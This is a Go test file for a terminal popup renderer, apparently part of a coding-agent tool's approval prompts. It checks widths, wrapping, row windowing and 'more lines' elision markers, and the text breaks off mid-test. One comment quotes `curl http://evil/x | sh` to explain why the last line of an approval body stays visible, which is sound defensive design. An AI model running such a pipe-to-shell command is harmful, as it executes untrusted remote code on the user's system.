package tui

import (
	"fmt"
	"regexp"
	"slices"
	"strings"
	"testing"

	lipgloss "charm.land/lipgloss/v2"
	"github.com/charmbracelet/x/ansi"

	"github.com/airiclenz/apogee/internal/scheme"
)

// popupLines splits a rendered popup into its physical (newline-separated) lines. ANSI escapes
// never carry a newline, so splitting the raw string is safe and keeps the styling for the width
// and SGR assertions.
func popupLines(out string) []string {
	if out == "" {
		return nil
	}
	return strings.Split(out, "\n")
}

// popupInterior strips a rendered popup line of its ANSI styling and its border+padding chrome,
// leaving just the content text — so an exact-match assertion sees "a" rather than "│ a       │".
func popupInterior(line string) string {
	return strings.Trim(strip(line), "│ ")
}

// elisionMarkerPattern matches EITHER wording of the "there is prose you cannot see" marker — the
// full phrase and the short form a narrow pane trades down to (popupElisionMarkerFitting). A
// property that only cares THAT the pane accounted for what it hid should not have to know which
// width it was drawn at; the tests that care about the wording assert it exactly.
var elisionMarkerPattern = regexp.MustCompile(`… \(\+\d+ more lines\)|… \+\d+`)

// Every rendered line — border runes included — is exactly the total width it was handed, with
// and without the optional title / hint rows, so the pane's right border always lands on the
// same column (the lipgloss v2 total-width contract renderStartupBox relies on).
func TestRenderPopupLinesAreExactWidth(t *testing.T) {
	th := newTheme(scheme.Default())
	base := popupSpec{
		title:    "saved sessions  (this workspace)",
		rows:     singleCellRows([]string{"first row", "second row", "third row"}),
		selected: 1,
		hint:     "esc close",
		maxRows:  8,
	}
	cases := map[string]popupSpec{
		"title+hint": base,
		"no title":   {rows: base.rows, selected: base.selected, hint: base.hint, maxRows: base.maxRows},
		"no hint":    {title: base.title, rows: base.rows, selected: base.selected, maxRows: base.maxRows},
		"rows only":  {rows: base.rows, selected: base.selected, maxRows: base.maxRows},
	}
	for name, spec := range cases {
		spec := spec
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			for _, width := range []int{40, 60, 98} {
				out := renderPopup(th, spec, width)
				for i, ln := range popupLines(out) {
					if w := lipgloss.Width(ln); w != width {
						t.Errorf("width %d: line %d is %d cells, want %d: %q", width, i, w, width, strip(ln))
					}
				}
			}
		})
	}
}

// The pane is filled solid black end to end: every printable cell — border runes, the black
// padding columns, title/row/hint text, and crucially the gap after a row shorter than the box —
// carries an explicit background (black, or the selected row's dark-gray highlight bar), so no
// cell is ever left on the terminal's default background. This is the regression guard for the
// "black-hole strip after short rows" bug: a bg-free line would surface as a bare cell here.
func TestRenderPopupIsFullyBlackFilled(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:    "saved sessions",                                                       // shorter than the box
		rows:     singleCellRows([]string{"x", "a much wider row label goes here", "y"}), // mix of short + wide
		selected: 1,                                                                      // the wide row is the dark-gray highlight bar
		hint:     "esc close",                                                            // shorter than the box
		maxRows:  8,
	}
	for _, width := range []int{40, 60, 98} {
		for i, ln := range popupLines(renderPopup(th, spec, width)) {
			if col, ok := firstCellWithoutBackground(ln); !ok {
				t.Errorf("width %d: line %d has a bare (no-background) cell at column %d: %q",
					width, i, col, strip(ln))
			}
		}
	}
}

// firstCellWithoutBackground walks a rendered line's SGR stream and reports the column of the
// first printable cell whose background is unset (terminal default). ok is true when every cell
// has a background. It tracks only the background attribute: 48;5;n / 48;2;r;g;b / the 40-47 and
// 100-107 basics set it; 49 and a 0/empty reset (\e[m) clear it.
func firstCellWithoutBackground(line string) (col int, ok bool) {
	bgSet := false
	runes := []rune(line)
	for i := 0; i < len(runes); {
		if runes[i] == '\x1b' && i+1 < len(runes) && runes[i+1] == '[' {
			j := i + 2
			for j < len(runes) && !((runes[j] >= 'A' && runes[j] <= 'Z') || (runes[j] >= 'a' && runes[j] <= 'z')) {
				j++
			}
			if j < len(runes) && runes[j] == 'm' {
				bgSet = applySGRBackground(bgSet, string(runes[i+2:j]))
			}
			i = j + 1
			continue
		}
		if !bgSet {
			return col, false
		}
		col++
		i++
	}
	return 0, true
}

// applySGRBackground folds one SGR parameter list into the running background-set state.
func applySGRBackground(bgSet bool, params string) bool {
	if params == "" {
		return false // \e[m — full reset
	}
	fields := strings.Split(params, ";")
	for k := 0; k < len(fields); k++ {
		switch fields[k] {
		case "0":
			bgSet = false
		case "49":
			bgSet = false
		case "48": // extended background: 48;5;n or 48;2;r;g;b — consume its arguments
			bgSet = true
			if k+1 < len(fields) && fields[k+1] == "5" {
				k += 2
			} else if k+1 < len(fields) && fields[k+1] == "2" {
				k += 4
			}
		case "40", "41", "42", "43", "44", "45", "46", "47",
			"100", "101", "102", "103", "104", "105", "106", "107":
			bgSet = true
		}
	}
	return bgSet
}

// A row wider than the inner budget is truncated, never wrapped: the pane's physical line count
// is exactly 2 (borders) + title + shown rows + hint, and the long row ends in an ellipsis.
func TestRenderPopupLongRowDoesNotWrap(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:    "commands",
		rows:     singleCellRows([]string{"short", strings.Repeat("verylongtoken ", 12), "also short"}),
		selected: 1,
		hint:     "esc dismiss",
		maxRows:  8,
	}
	out := renderPopup(th, spec, 40)
	lines := popupLines(out)

	wantLines := 2 + 1 + len(spec.rows) + 1 // borders + title + rows + hint
	if len(lines) != wantLines {
		t.Fatalf("popup has %d physical lines, want %d (a long row must truncate, not wrap):\n%s",
			len(lines), wantLines, strip(out))
	}
	if !strings.Contains(strip(out), "…") {
		t.Errorf("long row was not truncated to an ellipsis:\n%s", strip(out))
	}
}

// The selected row (within the scrolled window) carries the ❯ marker and the userBlock highlight
// SGR; the check is a loose contains on the un-stripped output, not a byte golden, so a lipgloss
// renderer change cannot false-fail it.
func TestRenderPopupSelectedRowHighlight(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:    "files",
		rows:     singleCellRows([]string{"one.go", "two.go", "three.go"}),
		selected: 2,
		hint:     "esc dismiss",
		maxRows:  8,
	}
	out := renderPopup(th, spec, 50)

	if !strings.Contains(strip(out), glyphUser+" three.go") {
		t.Errorf("selected row missing the %q marker:\n%s", glyphUser, strip(out))
	}
	probe := th.userBlock.Render("x")
	sgr := probe[:strings.IndexByte(probe, 'm')+1] // the userBlock fg+bg SGR, up to and including its 'm'
	if !strings.Contains(out, sgr) {
		t.Errorf("selected row carries no userBlock highlight SGR %q", sgr)
	}
}

// popupLineWith is the rendered pane's first line whose visible text contains want — the line an
// assertion about ONE row's styling has to reach without reconstructing the row's own padding.
func popupLineWith(t *testing.T, out, want string) string {
	t.Helper()
	for _, ln := range popupLines(out) {
		if strings.Contains(strip(ln), want) {
			return ln
		}
	}
	t.Fatalf("no rendered line carries %q:\n%s", want, strip(out))
	return ""
}

// A row's KIND decides how it is painted, ahead of the selection (popupSpec.rowKinds): a section
// header is white where the content rows are faint, and the row being EDITED carries the edit tone
// instead of the selection's own bar — the /settings pane's two treatments, owned by the module so
// every pane that ever divides or edits a list looks the same doing it.
func TestRenderPopupRowKindsPaintHeadingsAndTheEditedRow(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title: "settings",
		rows: []popupRow{
			{"UPSTREAM"}, {"server", "macStudio"}, {""}, {"AUTONOMY"}, {"mode", "ask-before"},
		},
		rowKinds: []popupRowKind{popupRowHeading, popupRowEditing, popupRowPlain, popupRowHeading, popupRowPlain},
		selected: 1,
		hint:     "esc close",
		maxRows:  8,
	}
	out := renderPopup(th, spec, 50)

	if !colorActive(th) {
		t.Skip("no colour on this profile: the styles are the whole claim")
	}
	for _, tc := range []struct {
		name  string
		text  string
		want  lipgloss.Style
		avoid lipgloss.Style
	}{
		{"section header", "UPSTREAM", th.popupHeading, th.statusFaint},
		{"edited row", "server", th.popupEdit, th.userBlock},
		{"plain row", "mode", th.statusFaint, th.popupEdit},
	} {
		t.Run(tc.name, func(t *testing.T) {
			line := popupLineWith(t, out, tc.text)
			if !strings.Contains(line, styleSGR(tc.want)) {
				t.Errorf("line %q carries no %q SGR", strip(line), styleSGR(tc.want))
			}
			if strings.Contains(line, styleSGR(tc.avoid)) {
				t.Errorf("line %q still carries the %q SGR it must not", strip(line), styleSGR(tc.avoid))
			}
		})
	}
}

// The body block may open with a LABEL the module paints as a heading (popupSpec.bodyLead) — and
// only where the line it is drawing still opens with it: a pane too narrow to seat the label breaks
// it across lines, and bolding what survived would be styling a word that is no longer the label.
func TestRenderPopupBodyLeadIsAHeadingOnlyWhileItSurvives(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:       "settings",
		body:        "Description: which autonomy the session runs at",
		bodyLead:    "Description:",
		maxBodyRows: -1,
		rows:        singleCellRows([]string{"mode"}),
		selected:    0,
		hint:        "esc close",
		maxRows:     8,
	}
	out := renderPopup(th, spec, 60)

	if got := strip(out); !strings.Contains(got, spec.body) {
		t.Errorf("the body lost its text:\n%s", got)
	}
	if !colorActive(th) {
		t.Skip("no colour on this profile: the styling is the rest of the claim")
	}
	line := popupLineWith(t, out, "Description:")
	if !strings.Contains(line, styleSGR(th.popupBodyLead)) {
		t.Errorf("the body label is not painted as a heading: %q", line)
	}

	// Ten cells of inner width: the label itself is hard-broken, so no line opens with it.
	narrow := renderPopup(th, spec, 14)
	if strings.Contains(narrow, styleSGR(th.popupBodyLead)) {
		t.Errorf("a broken label was still styled as one:\n%s", strip(narrow))
	}
}

// A spec with selected = −1 paints no marker and no highlight: every row is faint, no ❯ appears,
// and the userBlock SGR is absent from the output.
func TestRenderPopupNoSelection(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:    "skills",
		rows:     singleCellRows([]string{"alpha", "beta", "gamma"}),
		selected: -1,
		hint:     "esc dismiss",
		maxRows:  8,
	}
	out := renderPopup(th, spec, 50)

	if strings.Contains(strip(out), glyphUser) {
		t.Errorf("selected = -1 still painted a %q marker:\n%s", glyphUser, strip(out))
	}
	probe := th.userBlock.Render("x")
	sgr := probe[:strings.IndexByte(probe, 'm')+1]
	if strings.Contains(out, sgr) {
		t.Errorf("selected = -1 still carries the userBlock highlight SGR %q", sgr)
	}
}

// An empty title drops the title row and an empty hint drops the hint row — each is one fewer
// physical line than the same spec with the field set, and the dropped text is absent.
func TestRenderPopupEmptyTitleAndHintDropRows(t *testing.T) {
	th := newTheme(scheme.Default())
	full := popupSpec{
		title:    "saved sessions",
		rows:     singleCellRows([]string{"row one", "row two"}),
		selected: 0,
		hint:     "esc close",
		maxRows:  8,
	}
	const width = 50
	fullLines := len(popupLines(renderPopup(th, full, width)))

	noTitle := full
	noTitle.title = ""
	noTitleOut := renderPopup(th, noTitle, width)
	if got := len(popupLines(noTitleOut)); got != fullLines-1 {
		t.Errorf("empty title kept its row: %d lines, want %d", got, fullLines-1)
	}
	if strings.Contains(strip(noTitleOut), "saved sessions") {
		t.Errorf("empty title still rendered its text:\n%s", strip(noTitleOut))
	}

	noHint := full
	noHint.hint = ""
	noHintOut := renderPopup(th, noHint, width)
	if got := len(popupLines(noHintOut)); got != fullLines-1 {
		t.Errorf("empty hint kept its row: %d lines, want %d", got, fullLines-1)
	}
	if strings.Contains(strip(noHintOut), "esc close") {
		t.Errorf("empty hint still rendered its text:\n%s", strip(noHintOut))
	}
}

// popupRowHeightsOfOne is a list of total one-line rows: the shape every pane but a wrapping one
// hands the window, where counting lines and counting rows are the same count.
func popupRowHeightsOfOne(total int) []int {
	heights := make([]int, total)
	for i := range heights {
		heights[i] = 1
	}
	return heights
}

// popupRowWindow shows every row when the list fits the budget, keeps the window capped and roughly
// centred on a mid-list selection, and clamps at both ends — the cases the old inline windowing
// satisfied, unchanged now that the budget is spent in painted LINES. Past them: a wrapped row costs
// its real height, a separator between two seated rows costs a line of the same budget, and a row is
// seated whole or not at all — down to the budget that cannot seat the selected row itself, which is
// the empty window renderPopup counts onto the title row.
func TestPopupRowWindow(t *testing.T) {
	cases := []struct {
		name               string
		selected           int
		heights            []int
		gap, budget        int
		wantStart, wantEnd int
	}{
		{"fits under cap", 3, popupRowHeightsOfOne(5), 0, 8, 0, 5},
		{"exactly at cap", 4, popupRowHeightsOfOne(8), 0, 8, 0, 8},
		{"mid centred", 10, popupRowHeightsOfOne(30), 0, 8, 6, 14},
		{"clamp at start", 1, popupRowHeightsOfOne(30), 0, 8, 0, 8},
		{"clamp at end", 29, popupRowHeightsOfOne(30), 0, 8, 22, 30},
		{"no selection anchors at the top", -1, popupRowHeightsOfOne(30), 0, 8, 0, 8},
		{"empty list", 0, nil, 0, 8, 0, 0},
		{"wrapped rows spend their real height", 0, []int{3, 2, 1}, 0, 5, 0, 2},
		{"separators cost a line each", 0, popupRowHeightsOfOne(3), 1, 4, 0, 2},
		{"a row is seated whole or not at all", 1, []int{1, 3, 1}, 0, 3, 1, 2},
		{"a budget under the selected row's height seats nothing", 1, []int{1, 3, 1}, 0, 2, 0, 0},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			start, end := popupRowWindow(c.selected, c.heights, c.gap, c.budget)
			if start != c.wantStart || end != c.wantEnd {
				t.Errorf("popupRowWindow(%d,%v,gap %d,budget %d) = [%d,%d), want [%d,%d)",
					c.selected, c.heights, c.gap, c.budget, start, end, c.wantStart, c.wantEnd)
			}
			if spent := popupRowBlockLines(c.heights[start:end], c.gap, 0); spent > c.budget {
				t.Errorf("window [%d,%d) paints %d lines, past the %d-line budget", start, end, spent, c.budget)
			}
		})
	}
}

// A body longer than the inner budget word-wraps to several rows — each still exactly the box
// width, none wider than the pane — rather than truncating like a row. The body is the module's
// one wrapping content block.
func TestRenderPopupBodyWraps(t *testing.T) {
	th := newTheme(scheme.Default())
	const width = 40
	out := renderPopup(th, popupSpec{body: strings.Repeat("word ", 40), maxBodyRows: -1}, width)
	lines := popupLines(out)
	if len(lines) <= 2+1 { // 2 borders + more than one body row
		t.Fatalf("body did not wrap to multiple rows: %d physical lines:\n%s", len(lines), strip(out))
	}
	for i, ln := range lines {
		if w := lipgloss.Width(ln); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(ln))
		}
	}
}

// Embedded newlines in the body are layout, not text to reflow: a body "a\n\nb" renders three body
// rows with a blank middle row — the approval reason/args separator case.
func TestRenderPopupBodyPreservesNewlines(t *testing.T) {
	th := newTheme(scheme.Default())
	lines := popupLines(renderPopup(th, popupSpec{body: "a\n\nb", maxBodyRows: -1}, 40))
	if len(lines) != 2+3 { // 2 borders + 3 body rows
		t.Fatalf("body \"a\\n\\nb\" produced %d physical lines, want 5:\n%s", len(lines), strip(strings.Join(lines, "\n")))
	}
	if got := popupInterior(lines[1]); got != "a" {
		t.Errorf("first body row = %q, want \"a\"", got)
	}
	if got := popupInterior(lines[2]); got != "" {
		t.Errorf("middle body row = %q, want blank", got)
	}
	if got := popupInterior(lines[3]); got != "b" {
		t.Errorf("third body row = %q, want \"b\"", got)
	}
}

// A single token wider than the inner budget hard-breaks across body rows (wrapText's guarantee),
// so an unbroken blob can never blow past the pane's right edge.
func TestRenderPopupBodyHardBreaksLongToken(t *testing.T) {
	th := newTheme(scheme.Default())
	const width = 20
	out := renderPopup(th, popupSpec{body: strings.Repeat("x", 100), maxBodyRows: -1}, width)
	lines := popupLines(out)
	if len(lines) <= 2+1 {
		t.Fatalf("over-long token did not hard-break: %d physical lines:\n%s", len(lines), strip(out))
	}
	for i, ln := range lines {
		if w := lipgloss.Width(ln); w != width {
			t.Errorf("line %d is %d cells, want %d: %q", i, w, width, strip(ln))
		}
	}
}

// maxBodyRows caps the wrapped block: past the cap it keeps maxBodyRows−1 lines around a faint
// "… (+N more lines)" marker (N = hidden lines) for exactly maxBodyRows body rows; a body at the cap
// shows every line with no marker; a NEGATIVE cap shows everything. Zero is the separate case
// below.
//
// WHICH lines survive is the security half of this test (elisionSplit): the head AND the block's
// last line, the marker standing between them, wherever the budget can seat all three. A pane that
// kept only the head could be approved off `npm test` while the line the human never saw was
// `curl http://evil/x | sh` — the tail is where an appended payload lives, so the tail is the one
// line the cap may not spend. Below three rows there is no head-and-tail to have: two rows keep the
// FIRST line, which is the one that says what the block is, and one row is the marker alone.
func TestRenderPopupBodyMaxRows(t *testing.T) {
	th := newTheme(scheme.Default())
	const width = 40
	tenLines := strings.Join([]string{"l0", "l1", "l2", "l3", "l4", "l5", "l6", "l7", "l8", "l9"}, "\n")

	capped := popupLines(renderPopup(th, popupSpec{body: tenLines, maxBodyRows: 4}, width))
	if got := len(capped) - 2; got != 4 { // less the two borders
		t.Fatalf("cap 4 rendered %d body rows, want 4:\n%s", got, strip(strings.Join(capped, "\n")))
	}
	wantRows := []string{"l0", "l1", "… (+7 more lines)", "l9"}
	for i, want := range wantRows {
		if got := popupInterior(capped[1+i]); got != want {
			t.Errorf("body row %d = %q, want %q (head, marker, tail):\n%s", i, got, want, strip(strings.Join(capped, "\n")))
		}
	}

	// Two rows cannot seat a head, a marker and a tail, so the head keeps the single content row.
	twoRows := popupLines(renderPopup(th, popupSpec{body: tenLines, maxBodyRows: 2}, width))
	if got := len(twoRows) - 2; got != 2 {
		t.Fatalf("cap 2 rendered %d body rows, want 2:\n%s", got, strip(strings.Join(twoRows, "\n")))
	}
	if first, last := popupInterior(twoRows[1]), popupInterior(twoRows[2]); first != "l0" || last != "… (+9 more lines)" {
		t.Errorf("cap 2 body rows = %q, %q, want \"l0\", \"… (+9 more lines)\"", first, last)
	}

	atCap := popupLines(renderPopup(th, popupSpec{body: "a\nb\nc\nd", maxBodyRows: 4}, width))
	if got := len(atCap) - 2; got != 4 {
		t.Fatalf("body exactly at cap rendered %d body rows, want 4:\n%s", got, strip(strings.Join(atCap, "\n")))
	}
	if joined := strip(strings.Join(atCap, "\n")); strings.Contains(joined, "more lines") {
		t.Errorf("body exactly at cap emitted an overflow marker:\n%s", joined)
	}

	uncapped := popupLines(renderPopup(th, popupSpec{body: tenLines, maxBodyRows: -1}, width))
	if got := len(uncapped) - 2; got != 10 {
		t.Errorf("maxBodyRows -1 rendered %d body rows, want all 10", got)
	}
}

// A body budget of ZERO shows NO body rows — not every row, which is what "≤ 0 = uncapped" used to
// mean and what made a body-bearing pane one row taller than the shortest window it fits in. The
// title and the hint survive: they are the pane's irreducible chrome, and a budget of nothing is
// popupBudget saying the frame has no room for prose.
//
// What zero does NOT buy is silence. The dropped lines are counted onto the title row, so the pane
// is still four rows tall and still says there are three lines it is not showing — the approval
// prompt is a security surface, and a body that vanishes without a word is a decision taken against
// text the human was never told existed.
func TestRenderPopupBodyBudgetOfZeroShowsNoBodyButSaysSo(t *testing.T) {
	th := newTheme(scheme.Default())
	const width = 60 // wide enough to seat the title and the phrase in full; the narrow ladder is the test below

	lines := popupLines(renderPopup(th, popupSpec{
		title:       "approve write_file?",
		body:        strings.Join([]string{"l0", "l1", "l2"}, "\n"),
		maxBodyRows: 0,
		hint:        "a allow · d deny",
	}, width))

	if got := len(lines); got != 2+1+1 { // 2 borders + the title + the hint, and no body at all
		t.Fatalf("zero body budget rendered %d physical lines, want 4:\n%s", got, strip(strings.Join(lines, "\n")))
	}
	joined := strip(strings.Join(lines, "\n"))
	if strings.Contains(joined, "l0") {
		t.Errorf("zero body budget leaked body content:\n%s", joined)
	}
	if title := popupInterior(lines[1]); title != "approve write_file?  … (+3 more lines)" {
		t.Errorf("title row = %q, want the tool name plus the elision marker", title)
	}

	// A body the block CAN seat leaves the title alone: the marker rides the title only as the
	// fallback for a pane with no body row to put it on.
	seated := popupLines(renderPopup(th, popupSpec{
		title:       "approve write_file?",
		body:        strings.Join([]string{"l0", "l1", "l2"}, "\n"),
		maxBodyRows: 3,
		hint:        "a allow · d deny",
	}, width))
	if title := popupInterior(seated[1]); title != "approve write_file?" {
		t.Errorf("title row with the body seated = %q, want the bare title", title)
	}

	// One body row is enough to hold the marker itself, which is where it belongs when it fits.
	oneRow := popupLines(renderPopup(th, popupSpec{
		title:       "approve write_file?",
		body:        strings.Join([]string{"l0", "l1", "l2"}, "\n"),
		maxBodyRows: 1,
		hint:        "a allow · d deny",
	}, width))
	if title := popupInterior(oneRow[1]); title != "approve write_file?" {
		t.Errorf("title row with a body row to spare = %q, want the bare title", title)
	}
	if marker := popupInterior(oneRow[2]); marker != "… (+3 more lines)" {
		t.Errorf("body row = %q, want the elision marker", marker)
	}
}

// The title row seats the count at every WIDTH a pane can be drawn at, not just the wide ones.
// Composing the row at full length and clipping it to the inner budget meant the pane's name won
// the row and the count fell off the end of it — so on a terminal that was both short and narrow
// (the split tmux pane the title-row fallback exists for) the prose went silent again, exactly as
// it had before the marker learned to ride the title. The count now outranks the WORDING that
// carries it: the phrase sheds its noun first ("… +3"), and only past that is the NAME clipped —
// never the number.
func TestRenderPopupNarrowTitleKeepsTheElisionCount(t *testing.T) {
	th := newTheme(scheme.Default())
	const title = "approve write_file?"
	spec := popupSpec{
		title:       title,
		body:        strings.Join([]string{"l0", "l1", "l2"}, "\n"),
		maxBodyRows: 0,
		hint:        "a allow · d deny",
	}

	// The full phrase is 17 cells and the name 19, so with the two-space gutter the row seats both
	// from 38 inner cells — 42 columns — up. Below that the ladder takes over. Those 17 cells are
	// THIS case's single-digit "+3": every further digit costs one more, so the two-digit "+12" that
	// popup.go and layout.md walk through starts trading a column sooner — at 42 and below, not 41.
	// One ladder, one threshold per count width.
	cases := []struct {
		width int
		want  string // "" = the name is clipped at this width, so only the properties below are asserted
	}{
		{60, title + "  … (+3 more lines)"},
		{42, title + "  … (+3 more lines)"}, // the narrowest pane that seats the phrase in full
		{41, title + "  … +3"},              // one cell short: the noun goes, the count stays
		{34, title + "  … +3"},
		{24, ""}, // now the name gives way instead — the count still does not
		{20, ""},
		{12, ""},
	}

	for _, c := range cases {
		t.Run(fmt.Sprintf("%d columns", c.width), func(t *testing.T) {
			lines := popupLines(renderPopup(th, spec, c.width))
			if got := len(lines); got != 2+1+1 { // 2 borders + the title + the hint
				t.Fatalf("pane on a %d-column terminal rendered %d physical lines, want 4:\n%s",
					c.width, got, strip(strings.Join(lines, "\n")))
			}
			row := popupInterior(lines[1])
			if c.want != "" && row != c.want {
				t.Errorf("title row on a %d-column pane = %q, want %q", c.width, row, c.want)
			}
			if !strings.Contains(row, "+3") {
				t.Errorf("title row on a %d-column pane = %q: the count of hidden lines is not on it", c.width, row)
			}
			// …and the identity the decision turns on is still on it: whole where the width allows,
			// an honest prefix of the name where it does not.
			name, _, split := strings.Cut(row, popupGutter)
			if !split || name == "" || !strings.HasPrefix(title, strings.TrimSuffix(name, "…")) {
				t.Errorf("title row on a %d-column pane = %q: the pane's name is not legible on it", c.width, row)
			}
		})
	}
}

// A row budget of ZERO shows NO rows — and, exactly like the body budget above it, does not buy
// silence with the space it saves. A pane whose window granted it no rows had been dropping every
// choice or entry it held without a word, on the same 12-to-15-row terminal the body's title-row
// fallback was built for: the ask prompt showed none of its four answers while its hint still
// offered "↑↓ select", and /sessions showed none of its entries. The count now rides the title row
// with the body's, in the same marker and the same wording.
//
// A window that granted at least ONE row is deliberately NOT the same case: it scrolls around the
// selection, so its off-window rows are one keypress away rather than hidden, and a marker counting
// them would cost a row of the list it describes.
func TestRenderPopupRowBudgetOfZeroShowsNoRowsButSaysSo(t *testing.T) {
	th := newTheme(scheme.Default())
	const width = 60 // wide enough to seat the title and the phrase in full; the narrow ladder is below
	const title = "the assistant is asking:"
	choices := []string{"yes, go ahead", "no", "ask me again later", "stop and let me drive"}

	base := popupSpec{
		title:    title,
		rows:     singleCellRows(choices),
		selected: 0,
		hint:     "↑↓ select · ⏎ send",
	}

	t.Run("no rows shown", func(t *testing.T) {
		spec := base
		spec.maxRows = 0
		lines := popupLines(renderPopup(th, spec, width))
		if got := len(lines); got != 2+1+1 { // 2 borders + the title + the hint, and no rows at all
			t.Fatalf("zero row budget rendered %d physical lines, want 4:\n%s", got, strip(strings.Join(lines, "\n")))
		}
		if joined := strip(strings.Join(lines, "\n")); strings.Contains(joined, "ask me again later") {
			t.Errorf("zero row budget leaked a row:\n%s", joined)
		}
		if got := popupInterior(lines[1]); got != title+"  … (+4 more lines)" {
			t.Errorf("title row = %q, want the pane's name plus the count of its four hidden rows", got)
		}
	})

	t.Run("body and rows both hidden", func(t *testing.T) {
		spec := base
		spec.body = "l0\nl1\nl2"
		spec.maxBodyRows = 0
		spec.maxRows = 0
		lines := popupLines(renderPopup(th, spec, width))
		if got := len(lines); got != 2+1+1 {
			t.Fatalf("zero budget rendered %d physical lines, want 4:\n%s", got, strip(strings.Join(lines, "\n")))
		}
		// One fact, one marker: a title row too narrow to seat one count has no room for two, so the
		// hidden body lines and the hidden rows are counted together.
		if got := popupInterior(lines[1]); got != title+"  … (+7 more lines)" {
			t.Errorf("title row = %q, want one marker counting the 3 body lines and the 4 rows", got)
		}
	})

	t.Run("a scrolling window stays quiet", func(t *testing.T) {
		spec := base
		spec.maxRows = 2
		lines := popupLines(renderPopup(th, spec, width))
		if got := len(lines); got != 2+1+2+1 { // borders + title + the two windowed rows + hint
			t.Fatalf("row budget of 2 rendered %d physical lines, want 6:\n%s", got, strip(strings.Join(lines, "\n")))
		}
		if got := popupInterior(lines[1]); got != title {
			t.Errorf("title row = %q, want the bare title: the rows outside a scrolling window are reachable", got)
		}
	})

	t.Run("an empty offering owes nothing", func(t *testing.T) {
		spec := base
		spec.rows = nil
		spec.selected = -1
		spec.maxRows = 0
		lines := popupLines(renderPopup(th, spec, width))
		if got := popupInterior(lines[1]); got != title {
			t.Errorf("title row = %q, want the bare title: there is no list to hide", got)
		}
	})

	// The count survives the narrow pane too — the same ladder the body's marker sheds words on
	// (popupElisionMarkerFitting), because the module has ONE marker and not a second convention.
	for _, width := range []int{42, 41, 34, 24, 12} {
		t.Run(fmt.Sprintf("%d columns", width), func(t *testing.T) {
			spec := base
			spec.maxRows = 0
			row := popupInterior(popupLines(renderPopup(th, spec, width))[1])
			if !strings.Contains(row, "+4") {
				t.Errorf("title row on a %d-column pane = %q: the count of hidden rows is not on it", width, row)
			}
		})
	}
}

// Composition order is title / body / rows / hint: the body sits below the title and above the
// rows, the rows still truncate (never wrap) and keep their selected-row highlight, and an empty
// body adds no rows.
func TestRenderPopupBodyComposition(t *testing.T) {
	th := newTheme(scheme.Default())
	spec := popupSpec{
		title:       "the assistant is asking:",
		body:        "one line of body",
		maxBodyRows: -1,
		rows:        singleCellRows([]string{"yes", strings.Repeat("verylongword ", 12)}),
		selected:    0,
		hint:        "esc cancel",
		maxRows:     8,
	}
	const width = 50
	lines := popupLines(renderPopup(th, spec, width))
	if len(lines) != 2+1+1+2+1 { // borders + title + body + 2 rows + hint
		t.Fatalf("composed popup has %d physical lines, want 7:\n%s", len(lines), strip(strings.Join(lines, "\n")))
	}
	if !strings.Contains(strip(lines[1]), "the assistant is asking:") {
		t.Errorf("title is not the first content row: %q", strip(lines[1]))
	}
	if !strings.Contains(strip(lines[2]), "one line of body") {
		t.Errorf("body does not sit directly below the title: %q", strip(lines[2]))
	}
	if !strings.Contains(strip(lines[3]), glyphUser+" yes") {
		t.Errorf("selected row does not follow the body with its marker: %q", strip(lines[3]))
	}
	if !strings.Contains(strip(lines[4]), "…") { // the long row truncated (only two row lines exist ⇒ no wrap)
		t.Errorf("long row was not truncated: %q", strip(lines[4]))
	}
	if !strings.Contains(strip(lines[5]), "esc cancel") {
		t.Errorf("hint is not the last content row: %q", strip(lines[5]))
	}

	noBody := spec
	noBody.body = ""
	if got := len(popupLines(renderPopup(th, noBody, width))); got != len(lines)-1 {
		t.Errorf("empty body changed the row count by other than one: %d vs %d", got, len(lines)-1)
	}
}

// The body renders in its own (non-faint) style: a body line does NOT carry the faint chrome SGR
// the hint line does, so the two read as distinct tiers of the hierarchy (title bold / body normal
// / chrome faint).
func TestRenderPopupBodyIsNotFaint(t *testing.T) {
	th := newTheme(scheme.Default())
	lines := popupLines(renderPopup(th, popupSpec{body: "body text here", maxBodyRows: -1, hint: "esc cancel"}, 50))
	bodyLine, hintLine := lines[1], lines[2] // borders + body + hint

	faint := th.statusFaint.Render("x")
	idx := strings.IndexByte(faint, 'm')
	if idx < 0 {
		t.Skip("no colour profile in this environment — the faint-SGR distinction is not observable")
	}
	faintSGR := faint[:idx+1]
	if !strings.Contains(hintLine, faintSGR) {
		t.Fatalf("hint line lacks the faint SGR %q — test premise broken", faintSGR)
	}
	if strings.Contains(bodyLine, faintSGR) {
		t.Errorf("body line carries the hint's faint SGR %q; the body must render in a distinct style", faintSGR)
	}
}

// With a body present, a degenerate width still degrades gracefully: a width ≤ the border frame
// renders nothing, and an inner width of 1 neither panics nor produces a line wider than the box
// (the wrapped body and the overflow marker both clip to the single inner cell).
func TestRenderPopupBodyDegenerateWidth(t *testing.T) {
	th := newTheme(scheme.Default())
	frame := th.popupBorder.GetHorizontalFrameSize()
	spec := popupSpec{
		title:       "approve run?",
		body:        strings.Repeat("reason ", 30),
		maxBodyRows: 4,
		hint:        "esc cancel",
	}
	if out := renderPopup(th, spec, frame); out != "" {
		t.Errorf("width == frame should render nothing, got %q", strip(out))
	}
	out := renderPopup(th, spec, frame+1) // inner width 1 — must not panic
	for i, ln := range popupLines(out) {
		if w := lipgloss.Width(ln); w > frame+1 {
			t.Errorf("inner-width-1: line %d is %d cells, exceeds width %d: %q", i, w, frame+1, strip(ln))
		}
	}
}

// A degenerate width (≤ the border frame size, where a box cannot fit even one content cell)
// neither panics nor overflows: renderPopup degrades to an empty pane rather than a box wider
// than the window it was handed.
func TestRenderPopupDegenerateWidth(t *testing.T) {
	th := newTheme(scheme.Default())
	frame := th.popupBorder.GetHorizontalFrameSize()
	spec := popupSpec{
		title:    "saved sessions",
		rows:     singleCellRows([]string{"a row that is far wider than the tiny width"}),
		selected: 0,
		hint:     "esc close",
		maxRows:  8,
	}
	for _, width := range []int{frame, frame - 1, 1, 0} {
		out := renderPopup(th, spec, width) // must not panic
		for i, ln := range popupLines(out) {
			if w := lipgloss.Width(ln); w > width {
